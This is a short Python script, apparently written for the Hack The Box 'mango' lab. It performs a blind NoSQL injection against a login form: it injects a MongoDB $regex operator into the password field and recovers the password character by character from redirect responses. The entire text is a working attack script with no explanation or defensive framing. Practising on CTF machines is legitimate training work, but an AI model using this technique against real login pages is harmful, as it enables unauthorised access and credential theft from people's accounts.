#!/usr/bin/python3

#nosql password cracker with POST method - used for HTB(mango)
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="mango"
password=""
u="http://staging-order.mango.htb"
headers={'content-type': 'Application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|', '&']: # if c.isalnum() or c in :
            payload='username[$eq]=%s&password[$regex]=^%s&login=login' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c

